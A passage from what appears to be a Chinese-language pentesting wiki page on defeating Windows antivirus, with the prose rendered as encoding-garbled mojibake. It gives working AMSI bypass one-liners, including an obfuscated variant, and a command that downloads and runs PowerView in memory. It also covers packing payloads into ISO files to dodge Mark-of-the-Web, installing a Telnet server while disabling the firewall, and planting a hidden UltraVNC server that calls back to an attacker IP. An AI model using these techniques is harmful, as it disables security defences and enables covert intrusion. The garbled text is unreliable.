<p>å®ƒå…è®¸æ€æ¯’è§£å†³æ–¹æ¡ˆé€šè¿‡ä»¥æœªåŠ å¯†å’Œæœªæ··æ·†çš„å½¢å¼æš´éœ²è„šæœ¬å†…å®¹æ¥æ£€æŸ¥è„šæœ¬è¡Œä¸ºã€‚</p>
<p>è¿è¡Œ <code>IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')</code> å°†åœ¨Windows Defenderä¸Šäº§ç”Ÿä»¥ä¸‹è­¦æŠ¥ã€‚</p>
<figure><img src="../.gitbook/assets/image (1135).png" alt=""><figcaption></figcaption></figure>
<p>æ³¨æ„å®ƒæ˜¯å¦‚ä½•åœ¨è„šæœ¬è¿è¡Œçš„å¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„å‰åŠ ä¸Š <code>amsi:</code> çš„ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹æ˜¯powershell.exeã€‚</p>
<p>æˆ‘ä»¬æ²¡æœ‰å°†ä»»ä½•æ–‡ä»¶å†™å…¥ç£ç›˜ï¼Œä½†ä»ç„¶å› ä¸ºAMSIåœ¨å†…å­˜ä¸­è¢«æ•è·ã€‚</p>
<p>æœ‰å‡ ç§æ–¹æ³•å¯ä»¥ç»•è¿‡AMSIï¼š</p>
<ul>
<li><strong>æ··æ·†</strong></li>
</ul>
<p>ç”±äºAMSIä¸»è¦ä¾èµ–é™æ€æ£€æµ‹ï¼Œå› æ­¤ä¿®æ”¹ä½ å°è¯•åŠ è½½çš„è„šæœ¬å¯èƒ½æ˜¯è§„é¿æ£€æµ‹çš„å¥½æ–¹æ³•ã€‚</p>
<p>ç„¶è€Œï¼ŒAMSIæœ‰èƒ½åŠ›è§£æ··æ·†è„šæœ¬ï¼Œå³ä½¿å®ƒæœ‰å¤šå±‚ï¼Œå› æ­¤æ··æ·†å¯èƒ½æ˜¯ä¸€ä¸ªç³Ÿç³•çš„é€‰æ‹©ï¼Œå…·ä½“å–å†³äºå…¶å®ç°æ–¹å¼ã€‚è¿™ä½¿å¾—è§„é¿å˜å¾—ä¸é‚£ä¹ˆç®€å•ã€‚å°½ç®¡æœ‰æ—¶ï¼Œä½ æ‰€éœ€è¦åšçš„åªæ˜¯æ›´æ”¹å‡ ä¸ªå˜é‡åç§°ï¼Œä½ å°±å¯ä»¥æˆåŠŸï¼Œå› æ­¤è¿™å–å†³äºæŸä¸ªå†…å®¹è¢«æ ‡è®°çš„ç¨‹åº¦ã€‚</p>
<ul>
<li><strong>AMSIç»•è¿‡</strong></li>
</ul>
<p>ç”±äºAMSIæ˜¯é€šè¿‡å°†DLLåŠ è½½åˆ°powershellï¼ˆä¹ŸåŒ…æ‹¬cscript.exeã€wscript.exeç­‰ï¼‰è¿›ç¨‹ä¸­æ¥å®ç°çš„ï¼Œå› æ­¤å³ä½¿ä»¥éç‰¹æƒç”¨æˆ·èº«ä»½è¿è¡Œï¼Œä¹Ÿå¯ä»¥è½»æ¾ç¯¡æ”¹å®ƒã€‚ç”±äºAMSIå®ç°ä¸­çš„è¿™ä¸ªç¼ºé™·ï¼Œç ”ç©¶äººå‘˜å‘ç°äº†å¤šç§ç»•è¿‡AMSIæ‰«æçš„æ–¹æ³•ã€‚</p>
<p><strong>å¼ºåˆ¶é”™è¯¯</strong></p>
<p>å¼ºåˆ¶AMSIåˆå§‹åŒ–å¤±è´¥ï¼ˆamsiInitFailedï¼‰å°†å¯¼è‡´å½“å‰è¿›ç¨‹ä¸ä¼šå¯åŠ¨æ‰«æã€‚æœ€åˆè¿™æ˜¯ç”±<a href="https://twitter.com/mattifestation">Matt Graeber</a>æŠ«éœ²çš„ï¼Œå¾®è½¯å·²ç»å¼€å‘äº†ä¸€ä¸ªç­¾åä»¥é˜²æ­¢æ›´å¹¿æ³›çš„ä½¿ç”¨ã€‚</p>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-powershell">[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
</code></pre>
<p>{% endcode %}</p>
<p>åªéœ€ä¸€è¡Œ PowerShell ä»£ç å°±å¯ä»¥ä½¿å½“å‰ PowerShell è¿›ç¨‹æ— æ³•ä½¿ç”¨ AMSIã€‚ è¿™è¡Œä»£ç å½“ç„¶å·²ç»è¢« AMSI æœ¬èº«æ ‡è®°ï¼Œå› æ­¤éœ€è¦è¿›è¡Œä¸€äº›ä¿®æ”¹æ‰èƒ½ä½¿ç”¨æ­¤æŠ€æœ¯ã€‚</p>
<p>è¿™æ˜¯æˆ‘ä»è¿™ä¸ª <a href="https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db">Github Gist</a> ä¸­è·å–çš„ä¿®æ”¹ç‰ˆ AMSI ç»•è¿‡ã€‚</p>
<pre><code class="language-powershell">Try{#Ams1 bypass technic nÂº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÃ‚Â£nÃ‚Â£g' + 'e@+nt.Auto@' + 'Ã‚Â£tion.A' -join ''
$fdx = '@ms' + 'Ã‚Â£InÃ‚Â£' + 'tF@Ã‚Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Ã‚Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Ã‚Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
</code></pre>
<p>è¯·è®°ä½ï¼Œä¸€æ—¦è¿™ç¯‡æ–‡ç« å‘å¸ƒï¼Œè¿™å¯èƒ½ä¼šè¢«æ ‡è®°ï¼Œå› æ­¤å¦‚æœä½ çš„è®¡åˆ’æ˜¯ä¿æŒä¸è¢«æ£€æµ‹ï¼Œå°±ä¸åº”è¯¥å‘å¸ƒä»»ä½•ä»£ç ã€‚</p>
<p><strong>å†…å­˜è¡¥ä¸</strong></p>
<p>è¯¥æŠ€æœ¯æœ€åˆæ˜¯ç”± <a href="https://twitter.com/_RastaMouse/">@RastaMouse</a> å‘ç°çš„ï¼Œå®ƒæ¶‰åŠåœ¨ amsi.dll ä¸­æ‰¾åˆ° "AmsiScanBuffer" å‡½æ•°çš„åœ°å€ï¼ˆè´Ÿè´£æ‰«æç”¨æˆ·æä¾›çš„è¾“å…¥ï¼‰ï¼Œå¹¶ç”¨è¿”å› E_INVALIDARG ä»£ç çš„æŒ‡ä»¤è¦†ç›–å®ƒï¼Œè¿™æ ·ï¼Œå®é™…æ‰«æçš„ç»“æœå°†è¿”å› 0ï¼Œè¿™è¢«è§£é‡Šä¸ºå¹²å‡€çš„ç»“æœã€‚</p>
<p>{% hint style="info" %}
è¯·é˜…è¯» <a href="https://rastamouse.me/memory-patching-amsi-bypass/">https://rastamouse.me/memory-patching-amsi-bypass/</a> ä»¥è·å–æ›´è¯¦ç»†çš„è§£é‡Šã€‚
{% endhint %}</p>
<p>è¿˜æœ‰è®¸å¤šå…¶ä»–æŠ€æœ¯å¯ä»¥é€šè¿‡ powershell ç»•è¿‡ AMSIï¼ŒæŸ¥çœ‹ <a href="basic-powershell-for-pentesters/#amsi-bypass"><strong>æ­¤é¡µé¢</strong></a> å’Œ <a href="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell">æ­¤ä»“åº“</a> ä»¥äº†è§£æ›´å¤šä¿¡æ¯ã€‚</p>
<p>æˆ–è€…è¿™ä¸ªè„šæœ¬é€šè¿‡å†…å­˜è¡¥ä¸å°†è¡¥ä¸åº”ç”¨äºæ¯ä¸ªæ–°çš„ Powersh</p>
<h2 id="æ··æ·†"><a class="header" href="#æ··æ·†">æ··æ·†</a></h2>
<p>æœ‰å‡ ç§å·¥å…·å¯ä»¥ç”¨æ¥ <strong>æ··æ·† C# æ˜æ–‡ä»£ç </strong>ï¼Œç”Ÿæˆ <strong>å…ƒç¼–ç¨‹æ¨¡æ¿</strong> ä»¥ç¼–è¯‘äºŒè¿›åˆ¶æ–‡ä»¶æˆ– <strong>æ··æ·†å·²ç¼–è¯‘çš„äºŒè¿›åˆ¶æ–‡ä»¶</strong>ï¼Œä¾‹å¦‚ï¼š</p>
<ul>
<li><a href="https://github.com/h4wkst3r/InvisibilityCloak"><strong>InvisibilityCloak</strong></a><strong>: C# æ··æ·†å™¨</strong></li>
<li><a href="https://github.com/obfuscator-llvm/obfuscator"><strong>Obfuscator-LLVM</strong></a>: è¯¥é¡¹ç›®çš„ç›®çš„æ˜¯æä¾›ä¸€ä¸ªå¼€æºçš„ LLVM ç¼–è¯‘å¥—ä»¶åˆ†æ”¯ï¼Œèƒ½å¤Ÿé€šè¿‡ <a href="http://en.wikipedia.org/wiki/Obfuscation_(software)">ä»£ç æ··æ·†</a> å’Œé˜²ç¯¡æ”¹æä¾›å¢å¼ºçš„è½¯ä»¶å®‰å…¨æ€§ã€‚</li>
<li><a href="https://github.com/andrivet/ADVobfuscator"><strong>ADVobfuscator</strong></a>: ADVobfuscator æ¼”ç¤ºå¦‚ä½•ä½¿ç”¨ <code>C++11/14</code> è¯­è¨€åœ¨ç¼–è¯‘æ—¶ç”Ÿæˆæ··æ·†ä»£ç ï¼Œè€Œæ— éœ€ä½¿ç”¨ä»»ä½•å¤–éƒ¨å·¥å…·ä¸”ä¸ä¿®æ”¹ç¼–è¯‘å™¨ã€‚</li>
<li><a href="https://github.com/fritzone/obfy"><strong>obfy</strong></a>: æ·»åŠ ä¸€å±‚ç”± C++ æ¨¡æ¿å…ƒç¼–ç¨‹æ¡†æ¶ç”Ÿæˆçš„æ··æ·†æ“ä½œï¼Œè¿™å°†ä½¿æƒ³è¦ç ´è§£åº”ç”¨ç¨‹åºçš„äººç¨å¾®å›°éš¾ä¸€äº›ã€‚</li>
<li><a href="https://github.com/weak1337/Alcatraz"><strong>Alcatraz</strong></a><strong>:</strong> Alcatraz æ˜¯ä¸€ä¸ª x64 äºŒè¿›åˆ¶æ··æ·†å™¨ï¼Œèƒ½å¤Ÿæ··æ·†å„ç§ä¸åŒçš„ pe æ–‡ä»¶ï¼ŒåŒ…æ‹¬ï¼š.exe, .dll, .sys</li>
<li><a href="https://github.com/a0rtega/metame"><strong>metame</strong></a>: Metame æ˜¯ä¸€ä¸ªç®€å•çš„å˜å½¢ä»£ç å¼•æ“ï¼Œé€‚ç”¨äºä»»æ„å¯æ‰§è¡Œæ–‡ä»¶ã€‚</li>
<li><a href="https://github.com/ropfuscator/ropfuscator"><strong>ropfuscator</strong></a>: ROPfuscator æ˜¯ä¸€ä¸ªç»†ç²’åº¦çš„ä»£ç æ··æ·†æ¡†æ¶ï¼Œé€‚ç”¨äºä½¿ç”¨ ROPï¼ˆé¢å‘è¿”å›çš„ç¼–ç¨‹ï¼‰çš„ LLVM æ”¯æŒè¯­è¨€ã€‚ROPfuscator é€šè¿‡å°†å¸¸è§„æŒ‡ä»¤è½¬æ¢ä¸º ROP é“¾ï¼Œåœ¨æ±‡ç¼–ä»£ç çº§åˆ«æ··æ·†ç¨‹åºï¼Œé˜»ç¢æˆ‘ä»¬å¯¹æ­£å¸¸æ§åˆ¶æµçš„è‡ªç„¶æ¦‚å¿µã€‚</li>
<li><a href="https://github.com/icyguider/nimcrypt"><strong>Nimcrypt</strong></a>: Nimcrypt æ˜¯ä¸€ä¸ªç”¨ Nim ç¼–å†™çš„ .NET PE åŠ å¯†å™¨</li>
<li><a href="https://github.com/klezVirus/inceptor"><strong>inceptor</strong></a><strong>:</strong> Inceptor èƒ½å¤Ÿå°†ç°æœ‰çš„ EXE/DLL è½¬æ¢ä¸º shellcodeï¼Œç„¶ååŠ è½½å®ƒä»¬</li>
</ul>
<h2 id="smartscreen--motw"><a class="header" href="#smartscreen--motw">SmartScreen &amp; MoTW</a></h2>
<p>ä½ å¯èƒ½åœ¨ä»äº’è”ç½‘ä¸‹è½½æŸäº›å¯æ‰§è¡Œæ–‡ä»¶å¹¶æ‰§è¡Œå®ƒä»¬æ—¶è§è¿‡è¿™ä¸ªå±å¹•ã€‚</p>
<p>Microsoft Defender SmartScreen æ˜¯ä¸€ç§å®‰å…¨æœºåˆ¶ï¼Œæ—¨åœ¨ä¿æŠ¤æœ€ç»ˆç”¨æˆ·å…å—è¿è¡Œæ½œåœ¨æ¶æ„åº”ç”¨ç¨‹åºçš„å½±å“ã€‚</p>
<figure><img src="../.gitbook/assets/image (664).png" alt=""><figcaption></figcaption></figure>
<p>SmartScreen ä¸»è¦é‡‡ç”¨åŸºäºå£°èª‰çš„æ–¹æ³•ï¼Œè¿™æ„å‘³ç€ä¸å¸¸ä¸‹è½½çš„åº”ç”¨ç¨‹åºå°†è§¦å‘ SmartScreenï¼Œä»è€Œè­¦å‘Šå¹¶é˜»æ­¢æœ€ç»ˆç”¨æˆ·æ‰§è¡Œè¯¥æ–‡ä»¶ï¼ˆå°½ç®¡å¯ä»¥é€šè¿‡ç‚¹å‡»æ›´å¤šä¿¡æ¯ -&gt; ä»ç„¶è¿è¡Œæ¥æ‰§è¡Œè¯¥æ–‡ä»¶ï¼‰ã€‚</p>
<p><strong>MoTW</strong>ï¼ˆç½‘ç»œæ ‡è®°ï¼‰æ˜¯ä¸€ä¸ª <a href="https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)">NTFS å¤‡ç”¨æ•°æ®æµ</a>ï¼Œå…¶åç§°ä¸º Zone.Identifierï¼Œä¸‹è½½æ¥è‡ªäº’è”ç½‘çš„æ–‡ä»¶æ—¶ä¼šè‡ªåŠ¨åˆ›å»ºï¼Œå¹¶é™„å¸¦ä¸‹è½½çš„ URLã€‚</p>
<figure><img src="../.gitbook/assets/image (237).png" alt=""><figcaption><p>æ£€æŸ¥ä»äº’è”ç½‘ä¸‹è½½çš„æ–‡ä»¶çš„ Zone.Identifier ADSã€‚</p></figcaption></figure>
<p>{% hint style="info" %}
é‡è¦çš„æ˜¯è¦æ³¨æ„ï¼Œä½¿ç”¨ <strong>å—ä¿¡ä»»</strong> ç­¾åè¯ä¹¦ç­¾åçš„å¯æ‰§è¡Œæ–‡ä»¶ <strong>ä¸ä¼šè§¦å‘ SmartScreen</strong>ã€‚
{% endhint %}</p>
<p>é˜²æ­¢ä½ çš„æœ‰æ•ˆè½½è·è·å¾—ç½‘ç»œæ ‡è®°çš„ä¸€ä¸ªéå¸¸æœ‰æ•ˆçš„æ–¹æ³•æ˜¯å°†å®ƒä»¬æ‰“åŒ…åœ¨æŸç§å®¹å™¨ä¸­ï¼Œä¾‹å¦‚ ISOã€‚è¿™æ˜¯å› ä¸ºç½‘ç»œæ ‡è®°ï¼ˆMOTWï¼‰ <strong>ä¸èƒ½</strong> åº”ç”¨äº <strong>é NTFS</strong> å·ã€‚</p>
<figure><img src="../.gitbook/assets/image (640).png" alt=""><figcaption></figcaption></figure>
<p><a href="https://github.com/mgeeky/PackMyPayload/"><strong>PackMyPayload</strong></a> æ˜¯ä¸€ä¸ªå°†æœ‰æ•ˆè½½è·æ‰“åŒ…åˆ°è¾“å‡ºå®¹å™¨ä¸­çš„å·¥å…·ï¼Œä»¥è§„é¿ç½‘ç»œæ ‡è®°ã€‚</p>
<p>ç¤ºä¾‹ç”¨æ³•ï¼š</p>
<pre><code class="language-powershell">PS C:\Tools\PackMyPayload&gt; python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          &lt;mb [at] binary-offensive.com&gt;
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
</code></pre>
<p>è¿™é‡Œæ˜¯ä¸€ä¸ªæ¼”ç¤ºï¼Œé€šè¿‡ä½¿ç”¨ <a href="https://github.com/mgeeky/PackMyPayload/">PackMyPayload</a> å°†æœ‰æ•ˆè´Ÿè½½æ‰“åŒ…åœ¨ ISO æ–‡ä»¶ä¸­æ¥ç»•è¿‡ SmartScreenã€‚</p>
<figure><img src="../.gitbook/assets/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>
<h2 id="c-ç¨‹åºé›†åå°„"><a class="header" href="#c-ç¨‹åºé›†åå°„">C# ç¨‹åºé›†åå°„</a></h2>
<p>åœ¨å†…å­˜ä¸­åŠ è½½ C# äºŒè¿›åˆ¶æ–‡ä»¶å·²ç»è¢«çŸ¥é“å¾ˆé•¿æ—¶é—´äº†ï¼Œè¿™ä»ç„¶æ˜¯è¿è¡Œåæ¸—é€å·¥å…·è€Œä¸è¢« AV æ•è·çš„éå¸¸å¥½æ–¹æ³•ã€‚</p>
<p>ç”±äºæœ‰æ•ˆè´Ÿè½½å°†ç›´æ¥åŠ è½½åˆ°å†…å­˜ä¸­è€Œä¸æ¥è§¦ç£ç›˜ï¼Œæˆ‘ä»¬åªéœ€æ‹…å¿ƒåœ¨æ•´ä¸ªè¿‡ç¨‹ä¸­ä¿®è¡¥ AMSIã€‚</p>
<p>å¤§å¤šæ•° C2 æ¡†æ¶ï¼ˆsliverã€Covenantã€metasploitã€CobaltStrikeã€Havoc ç­‰ï¼‰å·²ç»æä¾›äº†ç›´æ¥åœ¨å†…å­˜ä¸­æ‰§è¡Œ C# ç¨‹åºé›†çš„èƒ½åŠ›ï¼Œä½†æœ‰ä¸åŒçš„æ–¹æ³•æ¥åšåˆ°è¿™ä¸€ç‚¹ï¼š</p>
<ul>
<li><strong>Fork&amp;Run</strong></li>
</ul>
<p>è¿™æ¶‰åŠåˆ° <strong>ç”Ÿæˆä¸€ä¸ªæ–°çš„ç‰ºç‰²è¿›ç¨‹</strong>ï¼Œå°†ä½ çš„åæ¸—é€æ¶æ„ä»£ç æ³¨å…¥åˆ°è¯¥æ–°è¿›ç¨‹ä¸­ï¼Œæ‰§è¡Œä½ çš„æ¶æ„ä»£ç ï¼Œå®Œæˆåæ€æ­»æ–°è¿›ç¨‹ã€‚è¿™æœ‰å…¶ä¼˜ç‚¹å’Œç¼ºç‚¹ã€‚Fork å’Œ run æ–¹æ³•çš„å¥½å¤„åœ¨äºæ‰§è¡Œå‘ç”Ÿåœ¨æˆ‘ä»¬çš„ Beacon æ¤å…¥è¿›ç¨‹ <strong>ä¹‹å¤–</strong>ã€‚è¿™æ„å‘³ç€å¦‚æœæˆ‘ä»¬çš„åæ¸—é€æ“ä½œä¸­çš„æŸäº›äº‹æƒ…å‡ºé”™æˆ–è¢«æ•è·ï¼Œæˆ‘ä»¬çš„ <strong>æ¤å…¥ç‰©å­˜æ´»çš„æœºä¼šä¼šæ›´å¤§</strong>ã€‚ç¼ºç‚¹æ˜¯ä½ æœ‰ <strong>æ›´å¤§çš„æœºä¼š</strong> è¢« <strong>è¡Œä¸ºæ£€æµ‹</strong> æ•è·ã€‚</p>
<figure><img src="../.gitbook/assets/image (215).png" alt=""><figcaption></figcaption></figure>
<ul>
<li><strong>Inline</strong></li>
</ul>
<p>è¿™æ¶‰åŠå°†åæ¸—é€æ¶æ„ä»£ç  <strong>æ³¨å…¥åˆ°å…¶è‡ªèº«è¿›ç¨‹ä¸­</strong>ã€‚è¿™æ ·ï¼Œä½ å¯ä»¥é¿å…åˆ›å»ºæ–°è¿›ç¨‹å¹¶è®©å…¶è¢« AV æ‰«æï¼Œä½†ç¼ºç‚¹æ˜¯å¦‚æœä½ çš„æœ‰æ•ˆè´Ÿè½½æ‰§è¡Œå‡ºç°é—®é¢˜ï¼Œ<strong>å¤±å»ä½ çš„ beacon çš„æœºä¼šä¼šæ›´å¤§</strong>ï¼Œå› ä¸ºå®ƒå¯èƒ½ä¼šå´©æºƒã€‚</p>
<figure><img src="../.gitbook/assets/image (1136).png" alt=""><figcaption></figcaption></figure>
<p>{% hint style="info" %}
å¦‚æœä½ æƒ³äº†è§£æ›´å¤šå…³äº C# ç¨‹åºé›†åŠ è½½çš„ä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹è¿™ç¯‡æ–‡ç«  <a href="https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/">https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/</a> å’Œä»–ä»¬çš„ InlineExecute-Assembly BOF (<a href="https://github.com/xforcered/InlineExecute-Assembly">https://github.com/xforcered/InlineExecute-Assembly</a>)
{% endhint %}</p>
<p>ä½ è¿˜å¯ä»¥ <strong>ä» PowerShell åŠ è½½ C# ç¨‹åºé›†</strong>ï¼ŒæŸ¥çœ‹ <a href="https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader">Invoke-SharpLoader</a> å’Œ <a href="https://www.youtube.com/watch?v=oe11Q-3Akuk">S3cur3th1sSh1t çš„è§†é¢‘</a>ã€‚</p>
<h2 id="ä½¿ç”¨å…¶ä»–ç¼–ç¨‹è¯­è¨€"><a class="header" href="#ä½¿ç”¨å…¶ä»–ç¼–ç¨‹è¯­è¨€">ä½¿ç”¨å…¶ä»–ç¼–ç¨‹è¯­è¨€</a></h2>
<p>æ­£å¦‚åœ¨ <a href="https://github.com/deeexcee-io/LOI-Bins"><strong>https://github.com/deeexcee-io/LOI-Bins</strong></a> ä¸­æå‡ºçš„ï¼Œå¯ä»¥é€šè¿‡è®©è¢«æ”»é™·çš„æœºå™¨è®¿é—® <strong>æ”»å‡»è€…æ§åˆ¶çš„ SMB å…±äº«ä¸Šçš„è§£é‡Šå™¨ç¯å¢ƒ</strong> æ¥ä½¿ç”¨å…¶ä»–è¯­è¨€æ‰§è¡Œæ¶æ„ä»£ç ã€‚</p>
<p>é€šè¿‡å…è®¸è®¿é—® SMB å…±äº«ä¸Šçš„è§£é‡Šå™¨äºŒè¿›åˆ¶æ–‡ä»¶å’Œç¯å¢ƒï¼Œä½ å¯ä»¥ <strong>åœ¨è¢«æ”»é™·æœºå™¨çš„å†…å­˜ä¸­æ‰§è¡Œè¿™äº›è¯­è¨€çš„ä»»æ„ä»£ç </strong>ã€‚</p>
<p>è¯¥ä»“åº“æŒ‡å‡ºï¼šDefender ä»ç„¶ä¼šæ‰«æè„šæœ¬ï¼Œä½†é€šè¿‡åˆ©ç”¨ Goã€Javaã€PHP ç­‰ï¼Œæˆ‘ä»¬æœ‰ <strong>æ›´å¤šçš„çµæ´»æ€§æ¥ç»•è¿‡é™æ€ç­¾å</strong>ã€‚ä½¿ç”¨è¿™äº›è¯­è¨€ä¸­çš„éšæœºæœªæ··æ·†åå‘ shell è„šæœ¬è¿›è¡Œæµ‹è¯•å·²è¯æ˜æˆåŠŸã€‚</p>
<h2 id="é«˜çº§è§„é¿"><a class="header" href="#é«˜çº§è§„é¿">é«˜çº§è§„é¿</a></h2>
<p>è§„é¿æ˜¯ä¸€ä¸ªéå¸¸å¤æ‚çš„è¯é¢˜ï¼Œæœ‰æ—¶ä½ å¿…é¡»è€ƒè™‘ä¸€ä¸ªç³»ç»Ÿä¸­è®¸å¤šä¸åŒçš„é¥æµ‹æ¥æºï¼Œå› æ­¤åœ¨æˆç†Ÿç¯å¢ƒä¸­å®Œå…¨ä¸è¢«æ£€æµ‹å‡ ä¹æ˜¯ä¸å¯èƒ½çš„ã€‚</p>
<p>ä½ æ‰€é¢å¯¹çš„æ¯ä¸ªç¯å¢ƒéƒ½æœ‰å…¶è‡ªèº«çš„ä¼˜ç¼ºç‚¹ã€‚</p>
<p>æˆ‘å¼ºçƒˆå»ºè®®ä½ è§‚çœ‹ <a href="https://twitter.com/DaniLJ94">@ATTL4S</a> çš„è¿™åœºæ¼”è®²ï¼Œä»¥äº†è§£æ›´å¤šé«˜çº§è§„é¿æŠ€æœ¯ã€‚</p>
<p>{% embed url="https://vimeo.com/502507556?embedded=true&amp;owner=32913914&amp;source=vimeo_logo" %}</p>
<p>è¿™ä¹Ÿæ˜¯ <a href="https://twitter.com/mariuszbit">@mariuszbit</a> å…³äºæ·±å…¥è§„é¿çš„å¦ä¸€åœºç²¾å½©æ¼”è®²ã€‚</p>
<p>{% embed url="https://www.youtube.com/watch?v=IbA7Ung39o4" %}</p>
<h2 id="æ—§æŠ€æœ¯"><a class="header" href="#æ—§æŠ€æœ¯"><strong>æ—§æŠ€æœ¯</strong></a></h2>
<h3 id="æ£€æŸ¥-defender-å‘ç°çš„æ¶æ„éƒ¨åˆ†"><a class="header" href="#æ£€æŸ¥-defender-å‘ç°çš„æ¶æ„éƒ¨åˆ†"><strong>æ£€æŸ¥ Defender å‘ç°çš„æ¶æ„éƒ¨åˆ†</strong></a></h3>
<p>ä½ å¯ä»¥ä½¿ç”¨ <a href="https://github.com/rasta-mouse/ThreatCheck"><strong>ThreatCheck</strong></a>ï¼Œå®ƒå°† <strong>åˆ é™¤äºŒè¿›åˆ¶æ–‡ä»¶çš„éƒ¨åˆ†</strong>ï¼Œç›´åˆ° <strong>æ‰¾å‡º Defender</strong> å‘ç°çš„æ¶æ„éƒ¨åˆ†å¹¶å°†å…¶åˆ†ç¦»ç»™ä½ ã€‚<br />
å¦ä¸€ä¸ªåš <strong>åŒæ ·äº‹æƒ…çš„å·¥å…·æ˜¯</strong> <a href="https://github.com/dobin/avred"><strong>avred</strong></a>ï¼Œå®ƒæä¾›äº†ä¸€ä¸ªå¼€æ”¾çš„ç½‘ç»œæœåŠ¡ï¼Œåœ°å€æ˜¯ <a href="https://avred.r00ted.ch/"><strong>https://avred.r00ted.ch/</strong></a></p>
<h3 id="telnet-æœåŠ¡å™¨"><a class="header" href="#telnet-æœåŠ¡å™¨"><strong>Telnet æœåŠ¡å™¨</strong></a></h3>
<p>ç›´åˆ° Windows 10ï¼Œæ‰€æœ‰ Windows éƒ½é™„å¸¦ä¸€ä¸ª <strong>Telnet æœåŠ¡å™¨</strong>ï¼Œä½ å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼å®‰è£…ï¼ˆä½œä¸ºç®¡ç†å‘˜ï¼‰ï¼š</p>
<pre><code class="language-bash">pkgmgr /iu:"TelnetServer" /quiet
</code></pre>
<p>ä½¿å…¶åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶<strong>å¯åŠ¨</strong>å¹¶<strong>ç«‹å³è¿è¡Œ</strong>ï¼š</p>
<pre><code class="language-bash">sc config TlntSVR start= auto obj= localsystem
</code></pre>
<p><strong>æ›´æ”¹telnetç«¯å£</strong> (éšè”½) å¹¶ç¦ç”¨é˜²ç«å¢™:</p>
<pre><code>tlntadmn config port=80
netsh advfirewall set allprofiles state off
</code></pre>
<h3 id="ultravnc"><a class="header" href="#ultravnc">UltraVNC</a></h3>
<p>ä»ä»¥ä¸‹é“¾æ¥ä¸‹è½½: <a href="http://www.uvnc.com/downloads/ultravnc.html">http://www.uvnc.com/downloads/ultravnc.html</a>ï¼ˆä½ éœ€è¦çš„æ˜¯äºŒè¿›åˆ¶ä¸‹è½½ï¼Œè€Œä¸æ˜¯å®‰è£…ç¨‹åºï¼‰</p>
<p><strong>åœ¨ä¸»æœºä¸Š</strong>: æ‰§è¡Œ <em><strong>winvnc.exe</strong></em> å¹¶é…ç½®æœåŠ¡å™¨:</p>
<ul>
<li>å¯ç”¨é€‰é¡¹ <em>Disable TrayIcon</em></li>
<li>åœ¨ <em>VNC Password</em> ä¸­è®¾ç½®å¯†ç </li>
<li>åœ¨ <em>View-Only Password</em> ä¸­è®¾ç½®å¯†ç </li>
</ul>
<p>ç„¶åï¼Œå°†äºŒè¿›åˆ¶æ–‡ä»¶ <em><strong>winvnc.exe</strong></em> å’Œ <strong>æ–°åˆ›å»ºçš„</strong> æ–‡ä»¶ <em><strong>UltraVNC.ini</strong></em> ç§»åŠ¨åˆ° <strong>å—å®³è€…</strong> æœºå™¨ä¸­</p>
<h4 id="åå‘è¿æ¥"><a class="header" href="#åå‘è¿æ¥"><strong>åå‘è¿æ¥</strong></a></h4>
<p><strong>æ”»å‡»è€…</strong>åº”åœ¨å…¶ <strong>ä¸»æœº</strong> ä¸­æ‰§è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶ <code>vncviewer.exe -listen 5900</code>ï¼Œä»¥ä¾¿å‡†å¤‡æ•è·åå‘ <strong>VNC è¿æ¥</strong>ã€‚ç„¶åï¼Œåœ¨ <strong>å—å®³è€…</strong> ä¸­: å¯åŠ¨ winvnc å®ˆæŠ¤è¿›ç¨‹ <code>winvnc.exe -run</code> å¹¶è¿è¡Œ <code>winwnc.exe [-autoreconnect] -connect &lt;attacker_ip&gt;::5900</code></p>
<p><strong>è­¦å‘Š:</strong> ä¸ºäº†ä¿æŒéšè”½æ€§ï¼Œä½ å¿…é¡»é¿å…ä»¥ä¸‹å‡ ä»¶äº‹</p>
<ul>
